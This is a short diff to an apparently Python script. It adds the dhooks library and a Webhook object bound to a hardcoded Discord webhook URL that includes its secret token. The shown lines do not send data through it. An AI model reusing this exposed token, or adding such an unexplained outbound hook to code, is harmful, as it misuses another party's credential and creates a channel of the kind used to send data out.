@@ -22,6 +22,9 @@ import traceback
 import datetime
 import sys
 import os
+import dhooks
+from dhooks import Webhook
+hook = Webhook("https://discord.com/api/webhooks/1190159623500599370/6MkykPaQT9A6vqvBhevlYjNzCOJI3oQRMGMXbMsT3HTXn0LMipDGztA6rpUdy_MwuTIJ?thread_id=1190160244706394153")
 
 from subprocess import check_output, PIPE
 
